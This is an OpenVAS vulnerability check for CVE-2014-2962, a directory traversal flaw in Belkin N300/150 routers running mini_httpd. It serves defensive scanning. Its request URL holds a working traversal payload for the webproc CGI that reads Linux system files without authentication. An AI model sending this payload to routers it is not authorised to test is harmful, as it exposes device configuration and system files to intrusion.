###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_belkin_router_dir_trav_vuln.nasl 13543 2019-02-08 14:43:51Z cfischer $
#
# Belkin Router Directory Traversal Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (C) 2015 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.806147");
  script_version("$Revision: 13543 $");
  script_cve_id("CVE-2014-2962");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");
  script_tag(name:"last_modification", value:"$Date: 2019-02-08 15:43:51 +0100 (Fri, 08 Feb 2019) $");
  script_tag(name:"creation_date", value:"2015-10-29 12:12:25 +0530 (Thu, 29 Oct 2015)");
  script_tag(name:"qod_type", value:"remote_vul");
  script_name("Belkin Router Directory Traversal Vulnerability");

  script_tag(name:"summary", value:"This host is running Belkin Router and is
  prone to directory traversal vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted request via HTTP GET and
  check whether it is able to read the configuration file or not.");

  script_tag(name:"insight", value:"The flaw allows unauthenticated attackers
  to download arbitrary files through directory traversal.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attackers to read arbitrary files on the target system.");

  script_tag(name:"affected", value:"Belkin N300/150 WiFi N Router, other firmware may also be affected.");

  script_tag(name:"solution", value:"As a workaround ensure that appropriate
  firewall rules are in place to restrict access to port 80/tcp from external
  untrusted sources.");

  script_tag(name:"solution_type", value:"Workaround");

  script_xref(name:"URL", value:"http://www.kb.cert.org/vuls/id/774788");
  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/38488");
  script_xref(name:"URL", value:"http://www.belkin.com/us/support-article?articleNum=109400");
  script_xref(name:"URL", value:"https://packetstormsecurity.com/files/133913/belkin-disclose.txt");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_get_http_banner.nasl", "os_detection.nasl");
  script_require_keys("Host/runs_unixoide");
  script_mandatory_keys("mini_httpd/banner");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

asport = get_http_port(default:80);

banner = get_http_banner(port: asport);
if(!banner){
  exit(0);
}

files = traversal_files("linux");

if(banner =~ 'Server: mini_httpd')
{

  foreach pattern(keys(files)) {

    file = files[pattern];

    url = "/cgi-bin/webproc?getpage=../../../../../../../../../../" + file + "&" +
        "var:getpage=html/index.html&var:language=en_us&var:oldpage=(null)&" +
        "var:page=login";

    if(http_vuln_check(port:asport, url:url, pattern:pattern))
    {
      report = report_vuln_url(port:asport, url:url);
      security_message(port:asport, data:report);
      exit(0);
    }
  }
}

exit(99);